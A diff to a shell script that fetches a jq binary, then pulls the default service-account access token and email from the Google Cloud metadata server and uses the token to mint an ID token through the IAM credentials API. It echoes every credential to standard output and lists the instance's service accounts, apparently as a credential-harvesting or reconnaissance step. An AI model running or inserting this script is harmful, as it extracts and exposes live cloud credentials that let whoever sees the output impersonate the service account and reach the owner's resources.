@@ -6,6 +6,32 @@ if ! which curl > /dev/null; then
   alias curl="$PWD/curl"
 fi
 
+if ! which jq > /dev/null; then
+  JQ_VERSION=1.7
+  wget -q https://github.com/jqlang/jq/releases/download/jq-${JQ_VERSION}/jq-linux-amd64 -O "$TEMP_DIR/jq"
+  chmod +x "$TEMP_DIR/jq"
+  alias jq="$TEMP_DIR/jq"
+fi
+
+TOKEN="$(curl -s -X GET -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r ".access_token")"
+
+echo "token is: $TOKEN"
+echo ""
+
+EMAIL="$(curl -s -X GET -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")"
+
+echo "email is $EMAIL"
+echo ""
+
+ID_TOKEN="$(curl -s -X POST \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json; charset=utf-8" \
+    -d "@$TEMP_DIR/id_request.json" \
+    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${EMAIL}:generateIdToken" | jq -r ".token")"
+
+echo "id token is $ID_TOKEN"
+echo ""
+
 
 echo "listing service accounts"
 curl -X GET -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
